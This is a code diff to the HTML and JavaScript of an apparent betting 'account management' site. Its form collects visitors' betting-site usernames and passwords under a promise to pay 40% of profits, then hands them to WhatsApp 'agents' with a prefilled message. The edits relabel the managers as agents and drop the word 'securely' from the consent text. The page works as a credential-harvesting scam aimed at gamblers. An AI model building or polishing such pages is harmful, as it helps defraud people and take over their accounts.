@@ -2308,7 +2308,7 @@
                         <label class="checkbox-container">
                             <input type="checkbox" id="botAgreeTerms">
                             <span class="checkmark"></span>
-                            I agree to share my betting account details securely and pay 40% of profits after each winning session.
+                            I agree to share my betting account details and pay 40% of profits after each winning session.
                         </label>
                     </div>
 
@@ -2339,13 +2339,13 @@
                         </div>
 
                         <div class="form-group">
-                            <label for="username">User ID / Username:</label>
+                            <label for="username">User ID / Phone:</label>
                             <input type="text" id="username" placeholder="Enter your betting site username" required>
                         </div>
 
                         <div class="form-group">
                             <label for="password">Password:</label>
-                            <input type="password" id="password" placeholder="Enter your betting site password" required>
+                            <input type="password" id="password" placeholder="Enter your password" required>
                         </div>
 
                         <button type="submit" class="account-btn">Submit Account Management Request</button>
@@ -2356,7 +2356,7 @@
                 <div id="step3" class="account-step step">
                     <div class="loading-container">
                         <i class="fas fa-user-tie"></i>
-                        <h3>Select Your Account Manager</h3>
+                        <h3>Select Your Agent</h3>
                         <p>Choose one of our professional account managers to continue via WhatsApp.</p>
                     </div>
 
@@ -2365,7 +2365,7 @@
                         <div class="agent-card" data-agent="michael">
                             <div class="agent-status"><i class="fas fa-circle"></i> Online Now</div>
                             <h4>Michael O.</h4>
-                            <p>Senior Account Manager</p>
+                            <p>Senior Agent</p>
                             <p>5+ years experience, specializes in high-stakes accounts.</p>
                             <button type="button"
                                 class="select-agent-btn"
@@ -2381,8 +2381,8 @@
                         <div class="agent-card" data-agent="john">
                             <div class="agent-status"><i class="fas fa-circle"></i> Online Now</div>
                             <h4>John K.</h4>
-                            <p>Account Manager</p>
-                            <p>3+ years experience, expert in risk management.</p>
+                            <p>Professional Agent</p>
+                            <p>3+ years experience, expert in risk management and high cashouts.</p>
                             <button type="button"
                                 class="select-agent-btn"
                                 data-agent-name="John K."
@@ -2397,7 +2397,7 @@
                     <div class="success-container" id="successMessage" style="display: none;">
                         <i class="fas fa-check-circle"></i>
                         <h3>Account Successfully Linked!</h3>
-                        <p>Your selected account manager will follow up with you on WhatsApp. Stay on the chat after sharing your stake amount.</p>
+                        <p>Your selected agent will proceed with you on WhatsApp. Stay on the chat and ask for further instructions.</p>
                         <button id="finishBtn" class="account-btn secondary">Close</button>
                     </div>
                 </div>
@@ -4402,7 +4402,7 @@ function handleFreeTrialContinue() {
 
                 successMessage?.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
 
-                const messageText = `Hello Agent ${selectedAgent?.name || ''} I just submitted my details for pay after win account management`;
+                const messageText = `Hello Agent ${selectedAgent?.name || ''} I just submitted my details for pay after win account management. How do we proceed?`;
                 const encodedMessage = encodeURIComponent(messageText.trim());
                 const baseWhatsappUrl = selectedAgent?.whatsapp?.split('?')[0] || (selectedAgent?.phone ? `https://wa.me/${selectedAgent.phone}` : null);
 
